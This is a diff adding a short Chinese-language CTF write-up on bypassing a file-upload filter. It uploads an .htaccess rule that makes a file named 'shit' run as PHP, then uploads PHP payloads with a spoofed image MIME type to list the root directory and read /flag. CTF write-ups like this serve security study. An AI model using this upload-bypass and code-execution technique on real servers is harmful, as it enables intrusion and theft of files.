@@ -245,3 +245,26 @@ echo md5("046eec27-a62c-4a05-b12a-bc7cc476b8b4".$scookie)
 修改session
 Unicode欺骗
 题有问题，没有源码
+[MRCTF2020]你传你🐎呢
+直接上传图片马，妄图修改后缀不可行，其同时过滤了文件后缀以及MIME,上传.htaccess，将名为shit的文件视为php执行：
+```
+<FilesMatch "shit" >
+
+SetHandler application/x-httpd-php
+
+</FilesMatch>
+```
+连续上传名为shit的马，无后缀，修改content type为image/png：
+```
+<?php
+
+var_dump(scandir('/'))
+
+?>
+<?php
+
+var_dump(file('/flag'))
+
+?>
+```
+第一次上传后发现根目录有/flag.第二次拿到flag
